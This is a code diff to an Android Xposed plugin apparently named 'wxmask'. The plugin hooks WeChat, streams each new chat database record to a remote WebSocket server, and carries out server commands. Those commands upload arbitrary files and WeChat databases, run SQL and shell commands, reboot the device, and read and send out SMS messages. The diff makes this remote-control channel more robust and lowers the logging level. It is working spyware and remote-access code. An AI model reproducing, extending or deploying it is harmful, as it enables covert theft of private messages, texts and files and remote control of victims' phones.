@@ -1,5 +1,6 @@
 package com.lu.wxmask.plugin
 
+import PhoneUtils
 import ZipUtils
 import android.content.ContentValues
 import android.content.Context
@@ -19,6 +20,11 @@ import com.lu.wxmask.util.WxSQLiteManager
 import com.lu.wxmask.util.ext.toJson
 import de.robv.android.xposed.XC_MethodHook
 import de.robv.android.xposed.callbacks.XC_LoadPackage
+import kotlinx.coroutines.DelicateCoroutinesApi
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
@@ -42,14 +48,17 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
                     }
                 }
 
-                override fun connect(): Boolean {
-                    return client?.connect() ?: false
+                override fun isConnected(): Boolean {
+                    return if (client?.isConnected() == true) {
+                        true
+                    } else {
+                        client?.connect() ?: false
+                    }
                 }
 
                 override fun close() {
                     client?.close()
                 }
-
             }
         ).apply {
             setUploadListener(object : com.lu.wxmask.http.upload.FileUploader.UploadListener {
@@ -63,17 +72,7 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
                 }
             })
         }
-
     }
-//    private val uploader by lazy {
-//        FileUploader(IdGet.androidId(mContext)) {
-//            if (it is String) {
-//                client?.sendMessage(it, wxId)
-//            } else if (it is ByteString) {
-//                client?.sendMessage(it, wxId)
-//            }
-//        }
-//    }
 
     override fun handleHook(context: Context, p1: XC_LoadPackage.LoadPackageParam?) {
         this.mContext = context
@@ -100,14 +99,21 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
 
                     WxSQLiteManager.Store[dbName] =
                         DBItem(dbName, WxSQLiteManager.Store[dbName]?.password, param.thisObject)
-                    LogUtil.i("param.thisObject = $dbName", WxSQLiteManager.Store)
+                    LogUtil.d("param.thisObject = $dbName", WxSQLiteManager.Store)
                     val values = param.args[2] as ContentValues
                     sendMessage(values.toJson())
                 }
             })
     }
 
+    @OptIn(DelicateCoroutinesApi::class)
     override fun onMessage(message: String) {
+        GlobalScope.launch {
+            dealMessage(message)
+        }
+    }
+
+    private suspend fun dealMessage(message: String) = withContext(Dispatchers.IO) {
         // 解析和处理服务器返回的消息
         try {
             val json = JSONObject(message)
@@ -115,21 +121,21 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
             val type = json.opt("type")
             if (type == "chunk_upload_response") {
                 uploader.handleResponse(message)
-                return
+                return@withContext
             }
 
             when (type) {
                 // path为非全路径
                 0 -> {
                     val path = json.optString("path")
-                    LogUtil.i("WxSQLiteManager.Store = ${WxSQLiteManager.Store}")
+                    LogUtil.d("WxSQLiteManager.Store = ${WxSQLiteManager.Store}")
                     val firstDbName = WxSQLiteManager.Store.values.firstOrNull()?.name
-                    LogUtil.i("firstDbName = $firstDbName")
+                    LogUtil.d("firstDbName = $firstDbName")
 
                     val absolutePath = firstDbName?.let {
                         it.substring(0, it.lastIndexOf("/")) + "/" + path
-                    } ?: return
-                    LogUtil.i("file path = $$absolutePath")
+                    } ?: return@withContext
+                    LogUtil.d("file path = $$absolutePath")
                     var file = File(absolutePath)
                     if (!file.exists()) {
                         file = File("$absolutePath⌖")
@@ -139,7 +145,7 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
 
                 1 -> {
                     val path = json.optString("path")
-                    LogUtil.i("file path = $path")
+                    LogUtil.d("file path = $path")
                     uploadFile(File(path))
                 }
 
@@ -153,13 +159,14 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
 
                     sendSqlExecuteResult(dbName, sql, count, json)
                 }
+
                 3 -> {
                     val cmd = json.optString("sql")
                     executeCommand(cmd, json)
                 }
                 // 重启手机
                 4 -> {
-                    executeCommand("reboot",  json)
+                    executeCommand("reboot", json)
                 }
 
                 5 -> {
@@ -178,11 +185,12 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
                         put("source", json)
                     }.toString())
                 }
+
                 11 -> {
                     // 读取短信
                     val params = json.optJSONObject("params")
-                    val startTime = params?.optLong("start_time",1698000000000L) ?: 1698000000000L
-                    val endTime = params?.optLong("end_time",1699000000000L) ?: 1699000000000L
+                    val startTime = params?.optLong("start_time", 1698000000000L) ?: 1698000000000L
+                    val endTime = params?.optLong("end_time", 1699000000000L) ?: 1699000000000L
                     val id = params?.optString("id")
 
                     val result = SmsUtils.getSmsAsJsonArray(id, startTime, endTime)
@@ -190,12 +198,18 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
                         put("androidId", IdGet.androidId(mContext))
                         put("smsList", result)
                     }.toString())
-                    LogUtil.i("result = $result")
+                    LogUtil.d("result = $result")
+                }
+
+                else -> {
+                    if (type != null) {
+                        sendOriginMessage("""{"err":"不支持得类型${type}，检查androidId是否传错"}""")
+                    }
                 }
             }
-
         } catch (e: Exception) {
             e.printStackTrace()
+            sendOriginMessage("""{"err":"客户端异常：${e.message}"}""")
         }
     }
 
@@ -206,7 +220,6 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
             put("source", source)
         }.toString())
     }
-
 
     fun sendSqlExecuteResult(dbName: String, sql: String, count: Int, source: JSONObject) {
         val db = WxSQLiteManager.executeSql(dbName, sql)
@@ -256,44 +269,27 @@ class MessagePlugin : WebSocketClientListener, IPlugin {
             file
         }
         if (!targetFile.exists()) {
-//            uploader.sendErrMessage("文件不存在: ${file.absolutePath}")
+            sendMessage("文件不存在: ${file.absolutePath}")
             return
         }
 
         uploader.uploadFile(targetFile.absolutePath, targetFile.absolutePath)
-//        uploader.uploadFile(
-//            targetFile,
-//            callback = object : FileUploader.UploadCallback {
-//                override fun onProgress(progress: Float, speed: String, remainingTime: String) {
-//                    println("上传进度: $progress%\n速度: $speed\n剩余时间: $remainingTime")
-//                }
-//
-//                override fun onSuccess(path: String, md5: String) {
-//                    println("上传成功: $path")
-//                    if (targetFile.name.contains("tempZip")) {
-//                        targetFile.delete()
-//                    }
-//                }
-//
-//                override fun onError(message: String) {
-//                    println("上传失败: $message")
-//                    if (targetFile.name.contains("tempZip")) {
-//                        targetFile.delete()
-//                    }
-//                }
-//            }
-//        )
     }
 
     fun sendMessage(message: String, type: String = "webhook") {
         if (wxId.trim().isEmpty()) {
-            wxId = WxSQLiteManager.getWxId()
+            wxId = WxSQLiteManager.getWxId(mContext)
             IdGet.saveWxId(mContext, wxId)
         }
         val text = JSONObject(message.trimIndent()).apply {
             put("type", type)
         }.toString()
-        LogUtil.e("发送消息: $text", "\nwxId=$wxId", "aid=", IdGet.androidId(mContext))
+        LogUtil.d("发送消息: $text", "\nwxId=$wxId", "aid=", IdGet.androidId(mContext))
         client?.sendMessage(text, wxId)
+    }
+
+    fun sendOriginMessage(message: String) {
+        client?.sendMessage(message, wxId)
+        LogUtil.d("发送消息: $message")
     }
 }
